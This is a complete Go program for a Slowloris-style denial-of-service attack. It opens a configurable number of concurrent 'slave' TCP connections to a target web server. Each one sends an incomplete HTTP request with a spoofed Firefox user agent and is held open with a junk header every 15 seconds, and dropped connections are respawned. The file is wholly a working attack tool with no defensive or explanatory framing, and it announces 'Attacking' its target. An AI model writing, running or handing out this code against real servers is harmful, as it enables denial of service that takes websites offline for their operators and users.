package main

import (
	"flag"
	"fmt"
	"math/rand"
	"net"
	"os"
	"sync"
	"time"
)

const crlf = "\r\n"
const timeout = 2        // seconds
const sleepDuration = 15 // seconds

var headers = []string{
	"GET / HTTP/1.1",
	"User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
	"Accept-language: en-US,en,q=0.5",
	"Connection: Keep-Alive",
}
var count = flag.Int("c", 100, "Number of slaves to run")
var port = flag.String("p", "80", "The port to run on")
var wg = &sync.WaitGroup{}

func usage() {
	fmt.Printf("Usage: %s [OPTIONS] target\n", os.Args[0])
	flag.PrintDefaults()
}

func runSlave(target string, id int) {
	conn, err := net.DialTimeout("tcp", target+":"+*port, timeout*time.Second)
	if err != nil {
		fmt.Printf("[%v] Error creating slave\n", id)
		wg.Done()
		return
	}
	// send headers
	for _, header := range headers {
		_, err = fmt.Fprint(conn, header+crlf)
		if err != nil {
			fmt.Printf("[%v] Error sending headers\n", id)
			wg.Done()
			return
		}
	}

	for {
		_, err = fmt.Fprintf(conn, "X-a: %v%s", rand.Intn(5000), crlf)
		if err != nil {
			fmt.Printf("[%v] Can't send data, respawning\n", id)
			defer runSlave(target, id)
			return
		}
		time.Sleep(sleepDuration * time.Second)
	}
}

func main() {
	// replace flag usage function with custom one
	flag.Usage = usage
	flag.Parse()
	if flag.NArg() < 1 {
		flag.Usage()
		return
	}
	target := flag.Arg(0)

	fmt.Printf("Attacking %s with %v slaves...\n", target, *count)
	for i := 0; i < *count; i++ {
		wg.Add(1)
		go runSlave(target, i)
	}

	wg.Wait()
}
